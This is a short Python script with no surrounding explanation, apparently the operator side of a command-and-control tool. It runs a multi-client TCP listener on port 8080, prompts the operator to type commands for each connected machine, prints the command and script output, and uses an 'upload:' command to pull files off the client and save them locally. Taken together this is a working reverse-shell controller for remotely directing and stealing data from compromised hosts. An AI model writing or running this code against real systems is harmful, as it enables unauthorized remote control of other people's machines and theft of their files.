import socket
import threading

clients = {}
lock = threading.Lock()

def handle_client(client_socket, address):
    global clients
    client_id = f"{address[0]}:{address[1]}"
    with lock:
        clients[client_id] = client_socket
    while True:
        command_to_send = input(f"Enter the command for client {client_id}: ")
        client_socket.send(command_to_send.encode())
        if command_to_send == 'exit':
            with lock:
                del clients[client_id]
            client_socket.close()
            break
        elif command_to_send.startswith('upload:'):
            filename = command_to_send.split(':')[1]
            file_content = client_socket.recv(4096)
            with open(filename, 'wb') as f:
                f.write(file_content)
        elif command_to_send.startswith('runscript:'):
            script_output = client_socket.recv(4096).decode()
            print(f"Script Output: {script_output}")
        else:
            command_output = client_socket.recv(1024).decode()
            print(f"Command Output: {command_output}")

# Create a server socket
server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
server.bind(('0.0.0.0', 8080))
server.listen(5)

while True:
    client_socket, addr = server.accept()
    client_thread = threading.Thread(target=handle_client, args=(client_socket, addr))
    client_thread.start()